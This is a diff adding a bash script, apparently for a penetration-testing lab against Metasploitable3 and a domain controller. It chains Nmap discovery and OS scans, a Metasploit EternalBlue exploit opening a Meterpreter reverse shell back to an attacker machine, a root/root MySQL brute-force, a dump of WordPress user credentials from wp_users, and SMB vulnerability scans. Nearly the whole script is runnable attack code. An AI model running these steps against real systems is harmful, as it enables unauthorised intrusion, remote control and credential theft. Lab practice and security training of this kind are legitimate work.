@@ -1,0 +1,80 @@
+#!/bin/bash
+
+# ----------------------------------------
+# Penetration Testing Automation Script
+# ----------------------------------------
+# Description: Automates information gathering, vulnerability scanning, exploitation, and database enumeration using Nmap, Metasploit, and MySQL.
+
+# --------------------
+# Part 1: Nmap Scanning
+# --------------------
+echo "Starting Nmap Ping Scan for Host Discovery in the network..."
+# Replace TARGET_NETWORK with your target network range
+nmap -sn TARGET_NETWORK/24
+
+echo "Running Nmap Version and OS Detection Scan on the Target Machine..."
+# Replace TARGET_IP with the IP address of your target machine (Metasploitable3)
+sudo nmap -sV -O TARGET_IP
+
+# ----------------------------
+# Part 2: Exploiting MS17-010 Vulnerability on the Target
+# ----------------------------
+echo "Launching Metasploit Framework to exploit the MS17-010 vulnerability..."
+# Launch Metasploit with specified configurations for exploiting EternalBlue vulnerability
+sudo msfconsole -q -x "
+use exploit/windows/smb/ms17_010_eternalblue;
+set RHOSTS TARGET_IP;  # The target machine to exploit (e.g., Metasploitable3)
+set LHOST KALI_IP;     # Kali Linux IP address to receive the reverse shell
+set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+set LPORT 4444;
+exploit;
+"
+
+# --------------------
+# Part 3: MySQL Brute-Force Login Attempt
+# --------------------
+echo "Running Metasploit's MySQL Login Scanner on the Target Machine..."
+# Using Metasploit's auxiliary module to brute-force MySQL login on Metasploitable3
+sudo msfconsole -q -x "
+use auxiliary/scanner/mysql/mysql_login;
+set RHOSTS TARGET_IP;
+set USERNAME root;
+set PASSWORD root;
+set THREADS 10;
+run;
+set CreateSession true;  # Enable session creation for interactive login
+run;
+"
+
+# -------------------------
+# Part 4: Direct MySQL Login from Kali Linux
+# -------------------------
+echo "Attempting Direct MySQL Login from Kali Linux..."
+# Direct MySQL connection from Kali to the Metasploitable3 machine
+mysql -u root -h TARGET_IP --skip-ssl -e 'SHOW DATABASES;'
+
+# -------------------------
+# Part 5: Database Enumeration and User Extraction
+# -------------------------
+echo "Switching to 'wordpress' Database and Enumerating User Table..."
+# Switch to 'wordpress' database and extract all user credentials from 'wp_users' table
+mysql -u root -h TARGET_IP --skip-ssl -e '
+USE wordpress;
+SHOW TABLES;
+SELECT * FROM wp_users;
+'
+
+# ----------------------------------------
+# Part 6: Scanning DC1 Domain Controller
+# ----------------------------------------
+echo "Running Nmap Version and OS Scan on DC1..."
+# Perform a version and OS detection scan on the DC1 machine
+# Replace DC1_IP with the IP address of your DC1 machine
+sudo nmap -sV -O DC1_IP
+
+# ----------------------------------------
+# Part 7: Running SMB Nmap Scripts on DC1
+# ----------------------------------------
+echo "Running Nmap SMB Vulnerability Script against the DC1 Machine..."
+# Run SMB vulnerability scan using Nmap's smb-vuln-* scripts
+sudo nmap --script smb-vuln* DC1_IP
